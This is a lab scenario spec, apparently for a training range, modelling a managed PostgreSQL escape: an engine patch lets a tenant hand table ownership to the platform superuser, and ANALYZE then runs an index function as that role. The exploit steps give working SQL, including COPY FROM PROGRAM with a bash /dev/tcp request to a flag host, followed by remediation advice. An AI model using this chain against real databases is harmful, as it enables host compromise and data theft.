@@ -1,0 +1,83 @@
+# K8S-44 托管 PostgreSQL 引擎补丁 → 平台角色宿主执行
+
+## 场景信息
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-44 |
+| 名称 | Managed PostgreSQL Engine Patch: Index Function Runs as Platform Role → Host RCE |
+| 技术/CVE | N/A (ATExecChangeOwner patch + ANALYZE, case #052) |
+| 难度 | L3 |
+| 交付方式 | Docker Compose |
+| 入口 | localhost:10625 |
+| 入口身份 | 宿主侧黑盒起点（无私有云凭据，需自行派生） |
+| 终点 | 数据库主机 经 flag-vault 交付（network-source：数据库主机地址（平台超级角色在主机上执行取回）） |
+
+## 场景概述
+平台运营方定制的 PostgreSQL 引擎允许租户管理员把表属主改为平台超级角色，
+而 ANALYZE 会以表属主身份重新求值索引表达式。攻击者串联两步后以平台角色在数据库主机执行命令。
+
+## 教材锚点
+- 案例：GCP Cloud SQL 逃逸到宿主（#052）
+- 平面：数据面（SQL）→ 宿主 RCE → 失败边界：宿主机
+- 六镜头：MAGIC（供应商对引擎的补丁代码是攻击面）；
+  IDENTITY（索引函数继承表属主身份）
+
+## 前置知识
+- PostgreSQL：索引表达式、ANALYZE、表属主、VOLATILE/IMMUTABLE 函数
+- 托管数据库角色阶梯：客户角色 < 平台超级角色 < 宿主 OS
+
+> 边界说明：`cloudsqluser` 不是超级用户，直接执行
+> `COPY ... FROM PROGRAM` 或读取宿主文件会被拒绝；以下漏洞链是唯一
+> 能以平台运营方角色执行命令的路径。
+
+## 利用步骤
+
+1. 建表并建一个无害的 IMMUTABLE 函数和索引（让索引合法建立）：
+   ```sql
+   CREATE TABLE temp_table (data text);
+   INSERT INTO temp_table VALUES ('dummy');
+   CREATE FUNCTION suid(text) RETURNS text IMMUTABLE
+     AS 'SELECT ''nothing''' LANGUAGE sql;
+   CREATE INDEX idx_malicious ON temp_table (suid(data));
+   ```
+2. 把表属主改成平台超级角色（引擎补丁允许）：
+   ```sql
+   ALTER TABLE temp_table OWNER TO cloudsqladmin;
+   ```
+3. 把函数体换成 VOLATILE 宿主命令。由于索引函数会以 platform 超级角色在数据库主机上执行，
+   直接在主机上向 flag-vault 取密文（`$p$` 引用避免与外层 `$$` 撞标签）：
+   ```sql
+   CREATE OR REPLACE FUNCTION suid(text) RETURNS text VOLATILE AS
+     $$ COPY public.shell_commands_results (data) FROM PROGRAM
+        $p$bash -c "exec 3<>/dev/tcp/flag-vault/5000; printf 'GET /flag HTTP/1.0
+
+' >&3; timeout 5 cat <&3"$p$;
+        SELECT 'done' $$ LANGUAGE sql;
+   ```
+4. 触发 `ANALYZE public.temp_table;`——控制台以 cloudsqladmin 身份重新求值索引函数，命令输出写入
+   `shell_commands_results`。
+5. `SELECT * FROM shell_commands_results;` 得到密文。
+
+## Flag
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 数据库主机 向 flag-vault 出示「数据库主机地址（platform 超级角色在主机上执行取回）」（校验模式 `network-source`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-44-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py k8s-44 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-44 <flag>`（参考利用）。
+
+## 此场景利用了哪些知识
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | PostgreSQL indexes, functions, ANALYZE, and managed roles |
+| 侦察与前置条件 | Table ownership mutation and platform-role execution semantics |
+| 核心漏洞与利用 | Chain owner change with a malicious index expression function |
+| 权限、横向或影响 | Platform-role to host command execution |
+| 验证 | Query shell command results to retrieve the host flag |
+
+## 修复建议
+客户角色不允许改表属主为平台运营方角色；ANALYZE 不得以表属主身份执行
+任意函数；宿主命令执行能力必须从引擎层剥离。
